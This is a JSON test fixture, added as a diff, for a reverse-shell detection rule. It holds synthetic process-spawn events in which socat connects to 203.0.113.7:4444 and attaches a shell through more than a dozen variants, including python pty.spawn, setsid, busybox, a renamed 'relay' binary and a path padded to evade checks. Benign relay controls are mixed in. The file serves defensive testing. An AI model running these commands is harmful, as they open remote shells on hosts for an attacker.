@@ -1,0 +1,507 @@
+{
+ "about": "Lot 313 (external bug hunt, edition 1.4: BUG-112, BUG-119; the mini-hunt's variants): one reader of socat's addresses. The distribution's socat (/usr/bin/socat, by the kernel's executed file) whose dual address runs a shell (`STDIO!!EXEC:/bin/sh`, `-!!exec:bash -li`, `STDIN!!SHELL:zsh`), whose EXEC: program is a shell behind a launcher (env, setsid, env -i with assignments, timeout with options), an interpreter running inline code (python3 -c pty.spawn), script, busybox's shell, a chain's link (socat 1.8), and SYSTEM: (always /bin/sh -c) running anything: R006's kill (Critical). A link named `relay` to /usr/bin/socat is socat: its shell killed, its relay recorded. A string cut at 255 bytes with no kernel path is no distribution's socat: the copy's kill (BUG-119). Controls: relays without a shell, a program, a script run by an interpreter: the relay's record (Log, High). On main every spelling here but the first word of an argument read as a relay, and the link was nothing.",
+ "fires": [
+  "R006_ReverseShellTooling"
+ ],
+ "items": [
+  {
+   "event": {
+    "ProcessSpawn": {
+     "pid": 6132001,
+     "ppid": 1,
+     "uid": 1000,
+     "gid": 1000,
+     "comm": "bash",
+     "filename": "/usr/bin/bash",
+     "timestamp_ns": 500000000000,
+     "argv": [
+      "-bash"
+     ],
+     "parent_comm": "sshd",
+     "start_ns": 499999000000,
+     "exe": {
+      "path": "/usr/bin/bash",
+      "flags": 1
+     }
+    }
+   }
+  },
+  {
+   "event": {
+    "ProcessSpawn": {
+     "pid": 6132010,
+     "ppid": 6132001,
+     "uid": 1000,
+     "gid": 1000,
+     "comm": "socat",
+     "filename": "/usr/bin/socat",
+     "timestamp_ns": 3700000000000,
+     "argv": [
+      "socat",
+      "TCP:203.0.113.7:4444",
+      "STDIO!!EXEC:/bin/sh"
+     ],
+     "parent_comm": "bash",
+     "start_ns": 3699999000000,
+     "exe": {
+      "path": "/usr/bin/socat",
+      "flags": 1
+     }
+    }
+   }
+  },
+  {
+   "event": {
+    "ProcessSpawn": {
+     "pid": 6132011,
+     "ppid": 6132001,
+     "uid": 1000,
+     "gid": 1000,
+     "comm": "socat",
+     "filename": "/usr/bin/socat",
+     "timestamp_ns": 3701000000000,
+     "argv": [
+      "socat",
+      "TCP-LISTEN:4444,reuseaddr",
+      "-!!exec:bash -li"
+     ],
+     "parent_comm": "bash",
+     "start_ns": 3700999000000,
+     "exe": {
+      "path": "/usr/bin/socat",
+      "flags": 1
+     }
+    }
+   }
+  },
+  {
+   "event": {
+    "ProcessSpawn": {
+     "pid": 6132012,
+     "ppid": 6132001,
+     "uid": 1000,
+     "gid": 1000,
+     "comm": "socat",
+     "filename": "/usr/bin/socat",
+     "timestamp_ns": 3702000000000,
+     "argv": [
+      "socat",
+      "TCP:203.0.113.7:4444",
+      "STDIN!!SHELL:zsh"
+     ],
+     "parent_comm": "bash",
+     "start_ns": 3701999000000,
+     "exe": {
+      "path": "/usr/bin/socat",
+      "flags": 1
+     }
+    }
+   }
+  },
+  {
+   "event": {
+    "ProcessSpawn": {
+     "pid": 6132013,
+     "ppid": 6132001,
+     "uid": 1000,
+     "gid": 1000,
+     "comm": "socat",
+     "filename": "/usr/bin/socat",
+     "timestamp_ns": 3703000000000,
+     "argv": [
+      "socat",
+      "TCP:203.0.113.7:4444",
+      "EXEC:/usr/bin/env sh"
+     ],
+     "parent_comm": "bash",
+     "start_ns": 3702999000000,
+     "exe": {
+      "path": "/usr/bin/socat",
+      "flags": 1
+     }
+    }
+   }
+  },
+  {
+   "event": {
+    "ProcessSpawn": {
+     "pid": 6132014,
+     "ppid": 6132001,
+     "uid": 1000,
+     "gid": 1000,
+     "comm": "socat",
+     "filename": "/usr/bin/socat",
+     "timestamp_ns": 3704000000000,
+     "argv": [
+      "socat",
+      "TCP:203.0.113.7:4444",
+      "SYSTEM:exec bash -i"
+     ],
+     "parent_comm": "bash",
+     "start_ns": 3703999000000,
+     "exe": {
+      "path": "/usr/bin/socat",
+      "flags": 1
+     }
+    }
+   }
+  },
+  {
+   "event": {
+    "ProcessSpawn": {
+     "pid": 6132015,
+     "ppid": 6132001,
+     "uid": 1000,
+     "gid": 1000,
+     "comm": "socat",
+     "filename": "/usr/bin/socat",
+     "timestamp_ns": 3705000000000,
+     "argv": [
+      "socat",
+      "TCP:203.0.113.7:4444",
+      "EXEC:/usr/bin/setsid bash -i"
+     ],
+     "parent_comm": "bash",
+     "start_ns": 3704999000000,
+     "exe": {
+      "path": "/usr/bin/socat",
+      "flags": 1
+     }
+    }
+   }
+  },
+  {
+   "event": {
+    "ProcessSpawn": {
+     "pid": 6132016,
+     "ppid": 6132001,
+     "uid": 1000,
+     "gid": 1000,
+     "comm": "socat",
+     "filename": "/usr/bin/socat",
+     "timestamp_ns": 3706000000000,
+     "argv": [
+      "socat",
+      "TCP:203.0.113.7:4444",
+      "EXEC:env -i PATH=/bin bash -i,pty,stderr"
+     ],
+     "parent_comm": "bash",
+     "start_ns": 3705999000000,
+     "exe": {
+      "path": "/usr/bin/socat",
+      "flags": 1
+     }
+    }
+   }
+  },
+  {
+   "event": {
+    "ProcessSpawn": {
+     "pid": 6132017,
+     "ppid": 6132001,
+     "uid": 1000,
+     "gid": 1000,
+     "comm": "socat",
+     "filename": "/usr/bin/socat",
+     "timestamp_ns": 3707000000000,
+     "argv": [
+      "socat",
+      "TCP:203.0.113.7:4444",
+      "EXEC:timeout -s KILL 3600 sh"
+     ],
+     "parent_comm": "bash",
+     "start_ns": 3706999000000,
+     "exe": {
+      "path": "/usr/bin/socat",
+      "flags": 1
+     }
+    }
+   }
+  },
+  {
+   "event": {
+    "ProcessSpawn": {
+     "pid": 6132018,
+     "ppid": 6132001,
+     "uid": 1000,
+     "gid": 1000,
+     "comm": "socat",
+     "filename": "/usr/bin/socat",
+     "timestamp_ns": 3708000000000,
+     "argv": [
+      "socat",
+      "TCP:203.0.113.7:4444",
+      "EXEC:python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
+     ],
+     "parent_comm": "bash",
+     "start_ns": 3707999000000,
+     "exe": {
+      "path": "/usr/bin/socat",
+      "flags": 1
+     }
+    }
+   }
+  },
+  {
+   "event": {
+    "ProcessSpawn": {
+     "pid": 6132019,
+     "ppid": 6132001,
+     "uid": 1000,
+     "gid": 1000,
+     "comm": "socat",
+     "filename": "/usr/bin/socat",
+     "timestamp_ns": 3709000000000,
+     "argv": [
+      "socat",
+      "TCP:203.0.113.7:4444",
+      "EXEC:script -qc /bin/bash /dev/null"
+     ],
+     "parent_comm": "bash",
+     "start_ns": 3708999000000,
+     "exe": {
+      "path": "/usr/bin/socat",
+      "flags": 1
+     }
+    }
+   }
+  },
+  {
+   "event": {
+    "ProcessSpawn": {
+     "pid": 6132020,
+     "ppid": 6132001,
+     "uid": 1000,
+     "gid": 1000,
+     "comm": "socat",
+     "filename": "/usr/bin/socat",
+     "timestamp_ns": 3710000000000,
+     "argv": [
+      "socat",
+      "TCP:203.0.113.7:4444",
+      "EXEC:busybox sh"
+     ],
+     "parent_comm": "bash",
+     "start_ns": 3709999000000,
+     "exe": {
+      "path": "/usr/bin/socat",
+      "flags": 1
+     }
+    }
+   }
+  },
+  {
+   "event": {
+    "ProcessSpawn": {
+     "pid": 6132021,
+     "ppid": 6132001,
+     "uid": 1000,
+     "gid": 1000,
+     "comm": "socat",
+     "filename": "/usr/bin/socat",
+     "timestamp_ns": 3711000000000,
+     "argv": [
+      "socat",
+      "TCP:203.0.113.7:4444",
+      "OPENSSL:203.0.113.7:443|EXEC:/bin/sh"
+     ],
+     "parent_comm": "bash",
+     "start_ns": 3710999000000,
+     "exe": {
+      "path": "/usr/bin/socat",
+      "flags": 1
+     }
+    }
+   }
+  },
+  {
+   "event": {
+    "ProcessSpawn": {
+     "pid": 6132022,
+     "ppid": 6132001,
+     "uid": 1000,
+     "gid": 1000,
+     "comm": "socat",
+     "filename": "/usr/bin/socat",
+     "timestamp_ns": 3712000000000,
+     "argv": [
+      "socat",
+      "TCP:203.0.113.7:4444",
+      "SYSTEM:while read c; do $c; done"
+     ],
+     "parent_comm": "bash",
+     "start_ns": 3711999000000,
+     "exe": {
+      "path": "/usr/bin/socat",
+      "flags": 1
+     }
+    }
+   }
+  },
+  {
+   "event": {
+    "ProcessSpawn": {
+     "pid": 6132023,
+     "ppid": 6132001,
+     "uid": 1000,
+     "gid": 1000,
+     "comm": "relay",
+     "filename": "/home/u/relay",
+     "timestamp_ns": 3713000000000,
+     "argv": [
+      "relay",
+      "TCP:203.0.113.7:4444",
+      "EXEC:/bin/sh"
+     ],
+     "parent_comm": "bash",
+     "start_ns": 3712999000000,
+     "exe": {
+      "path": "/usr/bin/socat",
+      "flags": 1
+     }
+    }
+   }
+  },
+  {
+   "event": {
+    "ProcessSpawn": {
+     "pid": 6132024,
+     "ppid": 6132001,
+     "uid": 1000,
+     "gid": 1000,
+     "comm": "socat",
+     "filename": "/usr/bin/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././",
+     "timestamp_ns": 3714000000000,
+     "argv": [
+      "socat",
+      "TCP:203.0.113.7:4444",
+      "TCP:127.0.0.1:80"
+     ],
+     "parent_comm": "bash",
+     "start_ns": 3713999000000,
+     "filename_truncated": true
+    }
+   }
+  },
+  {
+   "event": {
+    "ProcessSpawn": {
+     "pid": 6132025,
+     "ppid": 6132001,
+     "uid": 1000,
+     "gid": 1000,
+     "comm": "socat",
+     "filename": "/usr/bin/socat",
+     "timestamp_ns": 3715000000000,
+     "argv": [
+      "socat",
+      "TCP:203.0.113.7:4444",
+      "STDIO!!OPEN:/tmp/log,creat"
+     ],
+     "parent_comm": "bash",
+     "start_ns": 3714999000000,
+     "exe": {
+      "path": "/usr/bin/socat",
+      "flags": 1
+     }
+    }
+   }
+  },
+  {
+   "event": {
+    "ProcessSpawn": {
+     "pid": 6132026,
+     "ppid": 6132001,
+     "uid": 1000,
+     "gid": 1000,
+     "comm": "socat",
+     "filename": "/usr/bin/socat",
+     "timestamp_ns": 3716000000000,
+     "argv": [
+      "socat",
+      "TCP:203.0.113.7:4444",
+      "EXEC:/usr/bin/id"
+     ],
+     "parent_comm": "bash",
+     "start_ns": 3715999000000,
+     "exe": {
+      "path": "/usr/bin/socat",
+      "flags": 1
+     }
+    }
+   }
+  },
+  {
+   "event": {
+    "ProcessSpawn": {
+     "pid": 6132027,
+     "ppid": 6132001,
+     "uid": 1000,
+     "gid": 1000,
+     "comm": "socat",
+     "filename": "/usr/bin/socat",
+     "timestamp_ns": 3717000000000,
+     "argv": [
+      "socat",
+      "TCP:203.0.113.7:4444",
+      "EXEC:python3 /srv/relay/main.py"
+     ],
+     "parent_comm": "bash",
+     "start_ns": 3716999000000,
+     "exe": {
+      "path": "/usr/bin/socat",
+      "flags": 1
+     }
+    }
+   }
+  },
+  {
+   "event": {
+    "ProcessSpawn": {
+     "pid": 6132028,
+     "ppid": 6132001,
+     "uid": 1000,
+     "gid": 1000,
+     "comm": "socat",
+     "filename": "/usr/bin/socat",
+     "timestamp_ns": 3718000000000,
+     "argv": [
+      "socat",
+      "TCP-LISTEN:8080,fork",
+      "TCP:127.0.0.1:80"
+     ],
+     "parent_comm": "bash",
+     "start_ns": 3717999000000,
+     "exe": {
+      "path": "/usr/bin/socat",
+      "flags": 1
+     }
+    }
+   }
+  },
+  {
+   "event": {
+    "ProcessSpawn": {
+     "pid": 6132029,
+     "ppid": 6132001,
+     "uid": 1000,
+     "gid": 1000,
+     "comm": "relay",
+     "filename": "/home/u/relay",
+     "timestamp_ns": 3719000000000,
+     "argv": [
+      "relay",
+      "TCP-LISTEN:8080,fork",
+      "TCP:127.0.0.1:80"
+     ],
+     "parent_comm": "bash",
+     "start_ns": 3718999000000,
+     "exe": {
+      "path": "/usr/bin/socat",
+      "flags": 1
+     }
+    }
+   }
+  }
+ ]
+}
